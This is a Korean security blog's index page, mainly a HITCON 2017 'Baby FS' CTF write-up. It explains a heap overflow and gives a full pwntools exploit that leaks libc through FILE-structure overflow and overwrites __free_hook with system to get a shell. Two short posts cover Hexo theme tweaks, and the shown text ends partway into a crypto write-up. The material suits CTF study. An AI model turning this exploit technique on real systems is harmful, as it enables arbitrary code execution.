<!DOCTYPE html>
<html lang="zh-cmn-Hans">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>KiraSys</title>
  
  
  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
<div class="Shell">
    <aside class='SideBar'>
    <section class='avatar' style="background-image: url(/assets/header.png)">
        <div class='av-pic' style="background-image: url(/assets/logo.jpg)">
        </div>
    </section>
    <section class='menu'>
        <div>KiraSys</div>
        
            <div>CAT-Security</div>
        
        <ul>
          
            <a href="/" class="Btn">
              <li>Home</li>
            </a>  
          
            <a href="/archives/" class="Btn">
              <li>Archive</li>
            </a>  
          
            <a href="/categories/" class="Btn">
              <li>Categories</li>
            </a>  
          
        </ul>
    </section>
    <section class="media">
        
            
                <a href="https://github.com/kirasys">
                    <img src="/assets/github.svg" />
                </a>
            
        
            
                <a href="https://www.facebook.com/profile.php?id=100008635065103">
                    <img src="/assets/facebook.svg" />
                </a>
            
        
    </section>
</aside>

    <div class="container">
        <div data-pager-shell>
            <ul class="Index">
  
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/13/HITCON-2017-Baby-FS/">HITCON 2017 - Baby FS</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-13T04:07:09.000Z" itemprop="datePublished">
    2018-01-13
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/pwnable/">Pwnable</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h4 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h4><p>파일 입출력과 관련된 기능을 수행하는 프로그램이다. Open, Read, Write, Close 기능이 구현되어 있다.<br>Open 함수는 파일을 읽기 모드로 열고 파일과 관련된 정보들을 bss 영역에 저장한다. 저장되는 정보에는 파일 포인터, 파일 이름, 파일 길이, 파일 데이터를 저장할 공간 등이 있다. 만약 fopen이 실패하면 /tmp 에 파일을 하나 생성해 로깅한다.<br>Read 함수는 파일 포인터로 부터 원하는 크기만큼 데이터를 읽어와 힙 영역에 저장한다.<br>Write 함수는 저장한 데이터 1byte를 출력한다. Write 기능은 한번밖에 사용하지 못한다.<br>Close 함수는 파일과 관련된 모든 힙주소를 free하고 null로 정리한 후에 fclose 한다.<br><br><br></p>
<h4 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">filelen</span><span class="params">(FILE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// ST18_8@1</span></span><br><span class="line"></span><br><span class="line">  fseek(a1, <span class="number">0L</span>L, <span class="number">2</span>);</span><br><span class="line">  v1 = ftell(a1);</span><br><span class="line">  fseek(a1, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>취약점은 Open 함수에서 파일의 길이를 계산할 때 발생한다. Open 함수는 “proc”, “flag” 문자열만 필터링하므로 만약 /dev/ 디렉토리에 있는 디바이스를 Open 했을 때 파일 위치를 알려주는 ftell 함수가 -1을 리턴한다. 결국 calloc(1,0) 로 실행되고 0x20 정도의 heap 공간이 할당되는데 파일 길이는 unsigned로 인식되기 때문에 heap overflow가 발생한다.<br><br><br></p>
<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>문제 바이너리는 PIE가 적용되어 있고, heap overflow 외에 다른 취약점은 못찾아서 이 취약점으로 leak을 해야한다. Read 함수에서 fread 함수를 통해 heap overflow 할 때 읽어들이는 데이터를 조작할 수 있어야 하므로 /dev/fd/0 을 open하여 표준 입력을 통해 데이터를 입력받았다. 그리고 파일을 open할 때 FILE 구조체는 heap 할당되므로 처음에 /dev/fd/0 을 open하고 또 다른 파일을 하나 더 열어서 FSPO 공격을 이용하였다. </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	_IO_FILE file;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>FILE 구조체는 _IO_FILE_plus 구조체로 _IO_FILE 구조체와 vtable를 포함하고 있다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">   <span class="keyword">int</span> _flags;           <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">   <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">   <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">   <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">   <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">   <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">   <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">   <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">   <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">   <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">   <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">   <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">   <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">   <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"> </span><br><span class="line">   <span class="keyword">int</span> _fileno;</span><br><span class="line">   <span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">     <span class="keyword">int</span> _blksize;</span><br><span class="line">   <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">     <span class="keyword">int</span> _flags2;</span><br><span class="line">   <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">   _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"> </span><br><span class="line">   <span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">   <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">   <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">   <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"> </span><br><span class="line">   _IO_lock_t *_lock;</span><br><span class="line">   <span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>실제 FSPO를 할 때 overflow 되는 부분은 _IO_FILE의 flags 부터다. 리눅스 파일 I/O 과정을 간단하게 정리하면 파일을 읽기 모드로 열었을 때는 open과 동시에 파일 데이터가 _IO_buf_base 가 가리키는 곳에 버퍼링된다. fread 함수가 실행되면 _IO_read_ptr 을 참고하여(처음에는 _IO_buf_base과 동일) 요청한 크기만큼 사용자가 전달해준 버퍼에 복사한다. ftell 함수가 실행됬을 때 _IO_read_ptr가 반환되는 것이다. 요청을 처리하다가 _IO_read_ptr이 _IO_read_end와 같아지면 EOF를 반환한다. 파일을 쓰기 모드로 열고 fwrite를 통해 파일을 쓸 때는 사용자가 전달해준 데이터를 _IO_write_ptr에 복사하고 fclose나 fflush 함수가 실행됬을 때 _IO_buf_base가 가리키는 곳을 파일에 쓴다. 그리고 파일입출력과 관련된 함수 fclose, fread, fwrite 함수는 _IO_FILE_plus 구조체의 vtable을 참조하여 실행한다.</p>
<p>heap overflow를 할 때 무조건 마지막에 null이 추가되고 _IO_read_ptr - 0x10인 곳에 libc 주소가 저장되어 있기 때문에 _IO_read_ptr의 마지막 바이트가 \x10로 끝나게 만들려고 했지만 실패하였다. 결국 이용한 방법은 /dev/fd/0 과 같은 디바이스는 fseek(fp,0,0)이 실행되도 _IO_read_ptr 이 base로 변경되지 않고, fread가 실행된 후에 요청한 크기만큼 _IO_read_ptr가 증가한다는 점을 이용하여 leak 했다. /dev/fd/1을 2번째로 열고 heap overflow를 통해 _IO_read_ptr의 마지막 바이트를 \x00로 바꾼 뒤에 libc 주소가 저장된 곳의 오프셋만큼 fread하여서 _IO_read_ptr을 맞춰주는 것이다. _IO_read_ptr를 맞춰주는 과정에서 의도치 않은 heap overflow가 발생하여 next_chunk size가 0으로 바뀐다. write 기능은 한번밖에 실행하지 못해서 /dev/fd/1을 close 하는데 nextchunk_size가 0이면 abort된다. 그래서 nextchunk_size가 손상되지 않게 여러번 나눠서 fread 해야한다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">log.info(<span class="string">"Start libc leak (5 stage)"</span>)</span><br><span class="line">libc_leak = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">	log.info(str(i+<span class="number">1</span>) + <span class="string">' stage'</span>)</span><br><span class="line">	payload  = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x231</span>)</span><br><span class="line">	payload += p64(<span class="number">0xfbad2488</span>)</span><br><span class="line">	readfile(<span class="number">1</span>,len(payload),payload)	<span class="comment"># overflow _IO_read_ptr of /dev/fd/1</span></span><br><span class="line">	readfile(<span class="number">2</span>,<span class="number">0x10</span>)					<span class="comment"># if size &gt;= 0x18 then, top_chunk size corrupted</span></span><br><span class="line">	readfile(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">	readfile(<span class="number">2</span>,<span class="number">0x10</span> + i)</span><br><span class="line">	readfile(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">	libc_leak += writefile(<span class="number">2</span>)</span><br><span class="line">	closefile(<span class="number">2</span>)</span><br><span class="line">	openfile(<span class="string">'/dev/fd/1'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(libc_leak+<span class="string">'\x7f\x00\x00'</span>) - <span class="number">0x3C3260</span></span><br></pre></td></tr></table></figure>
<p>libc leak을 성공했으니 쉘을 실행시켜 보자. vtable을 조작하는 방식으로 공격할 수도 있지만 나는 _IO_write_ptr을 조작하면 데이터를 원하는 곳에 쓰는 방법을 이용하였다.<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Open - log</span></span><br><span class="line"><span class="keyword">if</span> ( !v2 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Can't open the file"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Waiting for loggging ..."</span>);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;log_msg, <span class="number">0x400</span>uLL, <span class="string">"Can't open file %s\n"</span>, &amp;s);</span><br><span class="line">    Logging(&amp;log_msg);</span><br><span class="line">    <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>프로그램에서 대부분의 파일은 읽기 모드로 열지만 파일이 존재하거나 권한이 없어서 open에 실패하면 로그 파일을 쓰기 모드로 열어서 로깅한다. 게다가 파일에 쓰는 내용도 내가 조작할 수 있다.  _IO_write_ptr을 free_hook 주소로 바꾸고 system 주소를 넣어주고 fclose 함수를 실행하여 system(‘sh’)를 실행시켰다. 주의할 점은 log_msg 끝에 개행이 들어가므로 _IO_write_end를 _IO_write_ptr+0x16의 값으로 설정해 개행을 없애줘야 한다.<br><br><br></p>
<h4 id="Addition"><a href="#Addition" class="headerlink" title="Addition"></a>Addition</h4><p>로그 파일의 _IO_write_ptr을 조작하는 방법말고 /dev/fd/0 를 fread 할 때 _IO_buf_base에 입력한 데이터가 들어가는 점을 이용하여 해결할 수도 있다. 물론 _IO_buf_end를 base보다 적절히 크게 설정해야 한다. 그리고 해당 문제는 socat과 pty,ctty,echo=0 옵션을 사용하였기 때문에 \x7f와 같은 문자가 제대로 들어가지 않아서 ‘\x16\x7f’ 로 바꿔서 exploit 해야 했다고 한다…<br><br><br></p>
<h4 id="Exploit-py"><a href="#Exploit-py" class="headerlink" title="Exploit.py"></a>Exploit.py</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = process(<span class="string">'/root/mbabyfs.bin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openfile</span><span class="params">(filename)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	s.sendline(<span class="string">'1'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(idx,size,data=<span class="string">''</span>)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	s.sendline(<span class="string">'2'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(size))</span><br><span class="line">	<span class="keyword">if</span> data!=<span class="string">''</span>:</span><br><span class="line">		s.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writefile</span><span class="params">(idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	s.sendline(<span class="string">'3'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line">	<span class="keyword">return</span> s.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-4</span>][<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closefile</span><span class="params">(idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	s.sendline(<span class="string">'4'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	s.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">'/dev/fd/0'</span>)			<span class="comment"># for align</span></span><br><span class="line">openfile(<span class="string">'aaaaaaaa'</span>)			<span class="comment"># for align</span></span><br><span class="line">openfile(<span class="string">'/dev/fd/0'</span>)</span><br><span class="line">openfile(<span class="string">'/dev/fd/1'</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Start libc leak (5 stage)"</span>)</span><br><span class="line">libc_leak = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">	log.info(str(i+<span class="number">1</span>) + <span class="string">' stage'</span>)</span><br><span class="line">	payload  = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x231</span>)</span><br><span class="line">	payload += p64(<span class="number">0xfbad2488</span>)</span><br><span class="line">	readfile(<span class="number">1</span>,len(payload),payload)	<span class="comment"># overflow _IO_read_ptr of /dev/fd/1</span></span><br><span class="line">	readfile(<span class="number">2</span>,<span class="number">0x10</span>)					<span class="comment"># if size &gt;= 0x18 then, top_chunk size corrupted</span></span><br><span class="line">	readfile(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">	readfile(<span class="number">2</span>,<span class="number">0x10</span> + i)</span><br><span class="line">	readfile(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">	libc_leak += writefile(<span class="number">2</span>)</span><br><span class="line">	closefile(<span class="number">2</span>)</span><br><span class="line">	openfile(<span class="string">'/dev/fd/1'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(libc_leak+<span class="string">'\x7f\x00\x00'</span>) - <span class="number">0x3C3260</span></span><br><span class="line">libc_free_hook = libc_base + <span class="number">0x00000000003C67A8</span></span><br><span class="line">libc_system = libc_base + <span class="number">0x0000000000045390</span></span><br><span class="line">log.info(<span class="string">"libc_base : "</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">closefile(<span class="number">2</span>)</span><br><span class="line">payload  = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x231</span>)</span><br><span class="line">payload += p64(<span class="number">0xfbad2488</span>) + p64(libc_free_hook<span class="number">-0x10</span>)*<span class="number">5</span> + p64(libc_free_hook + <span class="number">6</span>)</span><br><span class="line">readfile(<span class="number">0</span>,len(payload)<span class="number">-1</span>,payload[:<span class="number">-1</span>])</span><br><span class="line">openfile(p64(libc_system))</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x231</span>)</span><br><span class="line">payload += p32(<span class="number">0xfbad2488</span>) + <span class="string">';sh'</span></span><br><span class="line">readfile(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">exit()</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/12/Customize-hexo-theme-css/">Customize hexo theme css</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-12T02:40:02.000Z" itemprop="datePublished">
    2018-01-12
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/etc/">Etc</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <p>hexo icalm 테마에서 codeblock의 배경 색깔을 바꾸기 위해 style.css를 변경하는 방법을 찾아보았다. theme_name/source/css/_partial 폴더로 가면 styl 파일들이 여러개 있고, 그 중에 내가 바꾸고 싶은 부분을 처리해주는 부분을 찾아야한다. 나같은 경우는 codeblock css를 바꾸고 싶었기 때문에 code 클래스의 css를 변경해야 했다. </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//layout.styl</span><br><span class="line">figure.highlight, .code, code</span><br><span class="line">    font-family: Monaco, Menlo, Consolas, &apos;Microsoft Yahei&apos;, monospace</span><br><span class="line">    background-color: #f6f8fa</span><br><span class="line">    font-size: 13px</span><br><span class="line">    margin: auto 5px</span><br><span class="line">    pre</span><br><span class="line">        // width: 90%</span><br><span class="line">        margin: auto</span><br><span class="line">        overflow-x: auto</span><br><span class="line">        font-family: inherit</span><br><span class="line">        font-size: 13px</span><br><span class="line">        line-height: 1.6em</span><br></pre></td></tr></table></figure>
<p>.code에 background-color를 추가해주었더니 배경색깔이 바뀌었다.</p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/12/How-to-disable-hexo-codeblock-line-number/">Disable line number of hexo codeblock</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-12T02:39:11.000Z" itemprop="datePublished">
    2018-01-12
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/etc/">Etc</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <p>hexo를 사용하여 만든 post에서 codeblock에 기본적으로 line number가 적혀있다. line number가 있는게 이상해서 없애려고 했는데 구글링해봐도 잘나오지 않아 직접 찾아서 고쳤다. codeblock 부분의 html 소스를 보면 line number는 “gutter”라는 클래스에 포함되고 code는 “code” 클래스에 포함된다. gutter 클래스를 생성해주는 부분을 찾아보면 myblog/node_modules/hexo-util/lib/highlight.js에 있는 걸 확인할 수 있다.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//highlight.js</span><br><span class="line">  result += &apos;&lt;table&gt;&lt;tr&gt;&apos;;</span><br><span class="line">/*</span><br><span class="line">  if (gutter) &#123;</span><br><span class="line">    result += &apos;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&apos; + numbers + &apos;&lt;/pre&gt;&lt;/td&gt;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">*/</span><br><span class="line">  result += &apos;&lt;td class=&quot;code&quot;&gt;&apos; + before + content + after + &apos;&lt;/td&gt;&apos;;</span><br><span class="line">  result += &apos;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&apos;;</span><br></pre></td></tr></table></figure>
<p>gutter를 생성하는 부분의 코드를 주석 처리하고 변경된 모듈은 적용시켜 주면 된다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt;npm install hexo-util --save</span><br><span class="line">npm WARN saveError ENOENT: no such file or directory, open <span class="string">'C:\Users\user\package.json'</span></span><br><span class="line">npm notice created a lockfile as package-lock.json. You should commit this file.</span><br><span class="line">npm WARN enoent ENOENT: no such file or directory, open <span class="string">'C:\Users\user\package.json'</span></span><br><span class="line">npm WARN user No description</span><br><span class="line">npm WARN user No repository field.</span><br><span class="line">npm WARN user No README data</span><br><span class="line">npm WARN user No license field.</span><br><span class="line">npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.1.3 (node_modules\fsevents):</span><br><span class="line">npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform <span class="keyword">for</span> fsevents@1.1.3: wan</span><br><span class="line">t: &#123;<span class="string">"os"</span>:<span class="string">"win32"</span>,<span class="string">"arch"</span>:<span class="string">"x64"</span>&#125;)</span><br><span class="line"></span><br><span class="line">+ hexo-util@0.6.3</span><br><span class="line">added 116 packages and updated 1 package <span class="keyword">in</span> 13.541s</span><br></pre></td></tr></table></figure>
<p>생각보다 간단해보이지만 찾는데 시간이 꽤 걸렸다…</p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/11/HITCON-2017-Secret-Server/">HITCON 2017 - Secret Server</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-11T04:19:59.000Z" itemprop="datePublished">
    2018-01-11
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/crypto/">Crypto</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h4 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># aes.py - main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    proof_of_work()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'flag.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.read().strip()</span><br><span class="line">    <span class="keyword">assert</span> flag.startswith(<span class="string">'hitcon&#123;'</span>) <span class="keyword">and</span> flag.endswith(<span class="string">'&#125;'</span>)</span><br><span class="line">    send_msg(<span class="string">'Welcome!!'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            msg = recv_msg().strip()</span><br><span class="line">            <span class="keyword">if</span> msg.startswith(<span class="string">'exit-here'</span>):</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> msg.startswith(<span class="string">'get-flag'</span>):</span><br><span class="line">                send_msg(flag)</span><br><span class="line">            <span class="keyword">elif</span> msg.startswith(<span class="string">'get-md5'</span>):</span><br><span class="line">                send_msg(MD5.new(msg[<span class="number">7</span>:]).digest())</span><br><span class="line">            <span class="keyword">elif</span> msg.startswith(<span class="string">'get-time'</span>):</span><br><span class="line">                send_msg(str(time.time()))</span><br><span class="line">            <span class="keyword">elif</span> msg.startswith(<span class="string">'get-sha1'</span>):</span><br><span class="line">                send_msg(SHA.new(msg[<span class="number">8</span>:]).digest())</span><br><span class="line">            <span class="keyword">elif</span> msg.startswith(<span class="string">'get-sha256'</span>):</span><br><span class="line">                send_msg(SHA256.new(msg[<span class="number">10</span>:]).digest())</span><br><span class="line">            <span class="keyword">elif</span> msg.startswith(<span class="string">'get-hmac'</span>):</span><br><span class="line">                send_msg(HMAC.new(msg[<span class="number">8</span>:]).digest())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                send_msg(<span class="string">'command not found'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>먼저 문제에서 주어진 aes.py가 어떻게 돌아가는지 분석해보자. 사용자와 메시지를 주고 받는데 서버가 전송하는 메시지는 AES로 암호화된 메시지고 수신하는 메시지도 AES로 암호화하여 보내야된다. 그런데 암호화에 사용하는 key를 urandom으로 만들고 ‘get-flag’ 문자열을 암호화한 값을 모르기 때문에 명령어를 보낼 수 없다. ‘get-flag’ 명령을 실행시켜 암호화된 flag를 얻어오는게 첫번째 단계다. 그 다음은 flag를 복호화해야 하는데 정상적인 방법으로는 불가능하다. 두번째 단계는 암호화된 flag를 복호화하는 것이다.<br><br><br></p>
<h4 id="Stage-1-Get-encrypted-flag"><a href="#Stage-1-Get-encrypted-flag" class="headerlink" title="Stage 1 - Get encrypted flag"></a>Stage 1 - Get encrypted flag</h4><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAlkAAADyCAYAAAB+vNBDAAAABmJLR0QA/wD/AP+gvaeTAAAgAElEQVR4nO3debQkVZ3g8W/xik0KxEIWC5BFbEVRcAHcgBq1QRsVGm1skEbtFgGn1XFpFUG6xhntg+IgvSANuKENikIjLQrK2C2DULiwFouC8KDK4lUBVSwKVQhV88cv8rzIeJGZkUu8yIz8fs5552VmRNy8EfG7ETfuvREJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJGl+TwMsHOJ80TCYxvlVfkxjfs2qDqjOgobQEWJ/83Q+cB2zVZRonA/cUnHcZgyvQg0xL9WR8q86M7yFiJUutvBPYEHgV8Hzgs10ufy5RwKVhZHyrzozvIWElS62sA54E7gC+DeyZM8+niaudR4HrgQNS0yaZviKZAj4O/DxJ72vA3GTaGcB2wCXJMkcnn28LXACsTD7/UPL5c4BVwEuT9wuIg8HCNmlJWca36sz4lobYEuCo5PU84D+JKxtoLnxHEIVpAjgGWAFsmjPfFHAhcWW1IXAtcGTq+7JNxHOAq4FTgU2AnYBfAwcn048BbgWeBlyezNcqLSnL+FadGd/SkFsCPEQUrjVEId0+mTZJ60IwyfQVU3q+KZqvkj5D+4K1J/AwUfgb3k9cQTVcAtwM3ARs3CYtKcv4Vp0Z30NkbudZNKZOBL4LrAaeaDHP0UTh2Q54imj6fWaLeR9MvX6c9gMxdyIK3i2pzzYCbki9P5soqO8F1rZJS8pjfKvOjO8hYSVLrTxMNB+38lzgdGB/4ooE4C6iqbhb6zLvlxJXYrsTd8hkzQO+CHwZWEQ0Za9qkZaUx/hWnRnfQ8KB7+rVFsBjxEBIgDcDu/SY1kpgt9T7G4G7gVOIAjkBvADYJ5l+OvBL4D3ApcCZbdKSemF8q86M71liJUu9+hVwPtEEfCVwIM3Nw934LPB5omn7GOJq5lCi+fpO4AHgK8CWwCHAG4Djk2U/TNyp8o4WaUm9ML5VZ8a3JEmSJEmSJEmSJEmSJEmSJEmSJEmSJEmSJEmSNMZ6eYS+qpH38wQaLpan3hnfw8/47p3xPfyM7zHXqZA6fbinq72q94/T+5uu9qreP07vb3rP/FkdSZKkEljJkiRJKoGVLEmSpBJYyZIkSSqBlSxJkqQSWMmSJEkqgZUsSZKkEljJkiRJKoFPOB0dPgxw+Fmeemd8Dz/ju3fG9/AzviVJkiRJkiRp1i2qOgNSiRZVnQGpRIuqzoCk9hyjoDozvlVnxndB3l0oSZJUAitZkiRJJbCSJUmSVAIrWZIkSSUYZCVrEnh5H9Pz5iu6TDfKSHPUfAo4oY/lFwMvHlBeJEkaO0uAo7qY/2hg6+T1MmZWZNLT25lMLVt0mVb6yUc3LgM+nfP5IcAUM